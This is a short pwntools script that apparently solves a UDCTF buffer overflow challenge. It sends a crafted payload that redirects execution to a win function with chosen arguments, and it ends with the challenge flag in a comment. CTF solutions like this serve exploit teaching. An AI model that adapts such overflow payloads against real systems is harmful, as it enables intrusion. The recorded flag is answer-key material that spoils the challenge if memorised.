
from pwn import *

r = remote('challenges.ctfd.io', 30027)
# r = process('./bof.out')

r.readline()
r.sendline(b'AAAA')

p = b'A' * 2
p += p32(0xDEADBEEF) * 10
p += p32(0x08049236)
p += p32(0x0)
p += p32(0x14B4DA55)
p += p32(0x0)
p += p32(0x67616C66)
p += p32(0x0)

r.readline()
r.sendline(p)

print('\n',r.readall().split()[-1].decode())

# UDCTF{0bl1g4t0ry_buff3r_ov3rflow}